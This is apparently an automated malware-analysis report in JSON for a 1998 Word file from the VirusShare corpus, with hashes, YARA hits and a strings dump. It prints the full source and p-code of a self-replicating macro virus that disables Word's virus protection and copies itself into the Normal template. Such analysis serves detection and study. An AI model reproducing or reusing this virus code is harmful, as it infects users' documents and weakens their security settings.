{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "Chr": "May attempt to obfuscate specific str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "codemodule": "May attempt to modify the VBA code"
        },
        "macro": "Sub AutoOpen()\n\nOn Error GoTo 73\n\nOptions.VirusProtection = False\n\nOptions.SaveNormalPrompt = False\n\nOptions.ConfirmConversions = False\n\nties = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines\n\ntier = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines\n\nIf tier > 74 And ties > 0 Then GoTo 73\n\nIf tier < 74 Then\n\n Set tvir = NormalTemplate.VBProject.VBComponents.Item(1)\n\n ActiveDocument.VBProject.VBComponents.Item(1).Name = tvir.Name\n\n ActiveDocument.VBProject.VBComponents.Item(1).Export \"c:\\tie.sys\"\n\nEnd If\n\nIf ties = 0 Then Set tvir = ActiveDocument.VBProject.VBComponents.Item(1)\n\n Infection = Int(Rnd * 100)\n\n If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(69) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)\n\n If Day(Now) = 1 And (Month(Now) > 1) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)\n\n tvir.codemodule.AddFromFile (\"c:\\tie.sys\")\n\n With tvir.codemodule\n\n    For x = 1 To 4\n\n    .deletelines 1\n\n    Next x\n\n End With\n\n If tier < 74 Then\n\n    With tvir.codemodule\n\n    .replaceline 1, \"Sub AutoClose()\"\n\n    .replaceline 79, \"Sub ToolsMacro()\"\n       \n    rd1 = Int(Rnd * 25)\n\n If rd1 = 24 Then .replaceline 67, \".replaceline x, \"\"'\"\" & Application.ActivePrinter & Application.ActiveWindow\"\n    \nEnd With\n\n End If\n\n With tvir.codemodule\n\n    For x = 2 To 76 Step 2\n\n    .replaceline x, \"'\" & Application.UserName & Application.ActiveWindow\n\n    Next x\n\n End With\n\n73:\n\n If tier > 74 And ties = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\n\n End Sub\n\nSub ViewVBCode()\n\nEnd Sub\n\n\n\n\n\n\n' Processing file: VirusShare_adebb119a384eb1e3c4f141a8d2ca73e\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 4221 bytes\n' Line #0:\n' \tFuncDefn (Sub AutoOpen())\n' Line #1:\n' Line #2:\n' \tOnError 73 \n' Line #3:\n' Line #4:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #5:\n' Line #6:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #7:\n' Line #8:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #9:\n' Line #10:\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd codemodule \n' \tMemLd CountOfLines \n' \tSt ties \n' Line #11:\n' Line #12:\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd codemodule \n' \tMemLd CountOfLines \n' \tSt tier \n' Line #13:\n' Line #14:\n' \tLd tier \n' \tLitDI2 0x004A \n' \tGt \n' \tLd ties \n' \tLitDI2 0x0000 \n' \tGt \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tGoTo 73 \n' \tEndIf \n' Line #15:\n' Line #16:\n' \tLd tier \n' \tLitDI2 0x004A \n' \tLt \n' \tIfBlock \n' Line #17:\n' Line #18:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet tvir \n' Line #19:\n' Line #20:\n' \tLd tvir \n' \tMemLd New \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemSt New \n' Line #21:\n' Line #22:\n' \tLitStr 0x000A \"c:\\tie.sys\"\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tArgsMemCall Export 0x0001 \n' Line #23:\n' Line #24:\n' \tEndIfBlock \n' Line #25:\n' Line #26:\n' \tLd ties \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet tvir \n' \tEndIf \n' Line #27:\n' Line #28:\n' \tLd Rnd \n' \tLitDI2 0x0064 \n' \tMul \n' \tFnInt \n' \tSt Infection \n' Line #29:\n' Line #30:\n' \tLd Infection \n' \tLitDI2 0x0063 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0054 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0069 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0045 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0042 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0079 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0056 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0069 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0052 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0075 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0053 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tArgsCall MsgBox 0x0001 \n' \tEndIf \n' Line #31:\n' Line #32:\n' \tLd Now \n' \tArgsLd Day 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tLd Now \n' \tArgsLd Month 0x0001 \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0050 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0052 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x004F \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0056 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0069 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0052 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0075 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0053 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tArgsCall MsgBox 0x0001 \n' \tEndIf \n' Line #33:\n' Line #34:\n' \tLitStr 0x000A \"c:\\tie.sys\"\n' \tParen \n' \tLd tvir \n' \tMemLd codemodule \n' \tArgsMemCall AddFromFile 0x0001 \n' Line #35:\n' Line #36:\n' \tStartWithExpr \n' \tLd tvir \n' \tMemLd codemodule \n' \tWith \n' Line #37:\n' Line #38:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0004 \n' \tFor \n' Line #39:\n' Line #40:\n' \tLitDI2 0x0001 \n' \tArgsMemCallWith deletelines 0x0001 \n' Line #41:\n' Line #42:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #43:\n' Line #44:\n' \tEndWith \n' Line #45:\n' Line #46:\n' \tLd tier \n' \tLitDI2 0x004A \n' \tLt \n' \tIfBlock \n' Line #47:\n' Line #48:\n' \tStartWithExpr \n' \tLd tvir \n' \tMemLd codemodule \n' \tWith \n' Line #49:\n' Line #50:\n' \tLitDI2 0x0001 \n' \tLitStr 0x000F \"Sub AutoClose()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #51:\n' Line #52:\n' \tLitDI2 0x004F \n' \tLitStr 0x0010 \"Sub ToolsMacro()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #53:\n' Line #54:\n' \tLd Rnd \n' \tLitDI2 0x0019 \n' \tMul \n' \tFnInt \n' \tSt rd1 \n' Line #55:\n' Line #56:\n' \tLd rd1 \n' \tLitDI2 0x0018 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0043 \n' \tLitStr 0x004A \".replaceline x, \"'\" & Application.ActivePrinter & Application.ActiveWindow\"\n' \tArgsMemCallWith replaceline 0x0002 \n' \tEndIf \n' Line #57:\n' Line #58:\n' \tEndWith \n' Line #59:\n' Line #60:\n' \tEndIfBlock \n' Line #61:\n' Line #62:\n' \tStartWithExpr \n' \tLd tvir \n' \tMemLd codemodule \n' \tWith \n' Line #63:\n' Line #64:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLitDI2 0x004C \n' \tLitDI2 0x0002 \n' \tForStep \n' Line #65:\n' Line #66:\n' \tLd x \n' \tLitStr 0x0001 \"'\"\n' \tLd Application \n' \tMemLd UserName \n' \tConcat \n' \tLd Application \n' \tMemLd ActiveWindow \n' \tConcat \n' \tArgsMemCallWith replaceline 0x0002 \n' Line #67:\n' Line #68:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #69:\n' Line #70:\n' \tEndWith \n' Line #71:\n' Line #72:\n' \tLineNum 73 \n' \tBoS 0x0000 \n' Line #73:\n' Line #74:\n' \tLd tier \n' \tLitDI2 0x004A \n' \tGt \n' \tLd ties \n' \tLitDI2 0x0000 \n' \tEq \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #75:\n' Line #76:\n' \tEndSub \n' Line #77:\n' Line #78:\n' \tFuncDefn (Sub ViewVBCode())\n' Line #79:\n' Line #80:\n' \tEndSub \n' Line #81:\n' Line #82:\n' Line #83:\n' Line #84:\n' Line #85:\n"
    },
    "filename": "VirusShare_adebb119a384eb1e3c4f141a8d2ca73e",
    "filesize": 30208,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Title: =================================================, Author: Sherry Breach, Template: Normal.dot, Last Saved By: Sherry Breach, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sun Aug 23 06:17:00 1998, Last Saved Time/Date: Sun Aug 23 06:18:00 1998, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "adebb119a384eb1e3c4f141a8d2ca73e",
        "sha1": "bf9b2463045c21624b2b036f27b1a36108e67e99",
        "sha256": "c9134c14477eb9cfa2bd18e493abf6a3cce7754cc9d4ec4436d4f64cd8a8a2b6"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "=================================================",
            "              SUNRISE DOOR SOFTWARE                       ",
            "EMAIL   al@sunrisedoors.com  ",
            "ICQ     14055399                        ",
            "WWW     http://www.sunrisedoors.com                    ",
            "FTP     ftp://ftp.sunrisedoors.com                        ",
            "        ftp.execnet.com/sunrise",
            "        ftp.isonline.com/o/pub/sunrise                    ",
            "        ftp://vbarnet.com/sunrise",
            "VOICE   404-256-9518 (9am-9:30pm EST/EDT, any day          ",
            "==================================================",
            "Subscribe to our mailing list: send EMAIL to:              ",
            " majordomo@agoron.com, in body: subscribe sunrise-doors",
            "==================================================",
            "/ =!",
            "=================================================",
            "Sherry Breach",
            "Normal.dot",
            "Sherry Breach",
            "Microsoft Word 8.0",
            "VAU\u03bd",
            "=================================================",
            "Title",
            "_PID_GUID",
            "^zU\u03bd",
            "^zU\u03bd",
            "435dfa600",
            "1b<e",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "AutoOpen*",
            "Documentj",
            "Options",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "ties",
            "ActiveDocument\\",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "codemodule",
            "CountOfLines!\\",
            "tier",
            "NormalTemplateq",
            "tvirj",
            "Export",
            "Infection",
            "RndR",
            "MsgBoxR",
            "ChrK~",
            "Now%",
            "Month",
            "AddFromFileu",
            "c:\\tie.sys",
            "c:\\tie.sys",
            "Sub AutoClose()",
            "Sub ToolsMacro()C@R",
            ".replaceline x, \"'\" & Application.ActivePrinter & Application.ActiveWindowC@R",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "Sub Auto",
            "Open()",
            "On Err",
            "or GoTo ",
            "73\tption",
            "s.VirusProtec",
            "Save",
            "Conf",
            "versC,",
            "ties",
            "1ve.VB'",
            "Compo",
            "ns.Item",
            "(1).code",
            "module.C",
            "ountOfLines",
            "^'r'",
            "J#'If ",
            "> @74 AndA",
            " > 0 ThevnME",
            "# Set tvi$",
            "kE\u0131A",
            "rt \"c:\\@=",
            ".sys",
            "E=If",
            "@7#j+",
            "'Inf\u0196In",
            "* 100",
            "MsgBox C",
            "hr(32) +`",
            "84\t105",
            "L69%",
            "H117e",
            "Day(Now)R",
            "1BH(Monthc",
            "@\"80F",
            "KHoAddFrohmFi (IF#",
            "W8ithB_u>   F x!4",
            ".deletel\tay 1",
            "Next| x",
            "CQr m",
            ".re`cb",
            " 1, \"EdCl",
            "()]`",
            "ToolsMacroB",
            "rd1 ",
            "X25&@C",
            "24WYJ",
            "'\"\" & Applica.kPrinterr",
            "Window ",
            "7v%'x #22 ",
            "6 Step .2-",
            "Us|er",
            "\t:73:\"",
            ";=l1As AQ",
            "Full",
            "ViewV|BC e#q",
            "deletelines",
            "replaceline",
            "Application*",
            "UserName\\",
            "ActiveWindow+",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "ViewVBCode",
            "Project",
            "rstdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WINDOWS\\",
            "SYSTEM\\S",
            "tdOle2.t",
            "lb#OLE A",
            "utomatio",
            "mMSForms>",
            "F34F78",
            "04A-0D3C",
            "-11D2-BC",
            "31-EBFC6608DA5D",
            "3.TWD#Mi",
            "crosoft E",
            "` Ob",
            " Library",
            "PD,PJP\\VB$E\\(EX(.",
            "CxRN@UalCxNTaQx",
            " +\t,CK",
            "OPfficDO@f",
            "G{2DF8D0",
            "4C-5BFA-",
            "101B-BDER5@AA@4",
            "fPROGRAM",
            " FILES\\M",
            "ICROSOFT",
            " OFFICE\\",
            "MSO97.D",
            "LLHk# 8.0Ek",
            "BThisD",
            "ocument",
            "ThisDocument",
            "ID=\"{F2070D6B-3A0D-11D2-BC31-8B623C9DBE65}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"0A08EDE5F3E9F3E9F3E9F3E9\"",
            "DPB=\"1416F3F7F700F800F800\"",
            "GC=\"2321C407D208D2082D\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=22, 22, 470, 358, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "ftp://ftp.sunrisedoors.com",
            "http://www.sunrisedoors.com",
            "ftp://vbarnet.com/sunrise"
        ]
    },
    "time": "0:00:00.320101",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
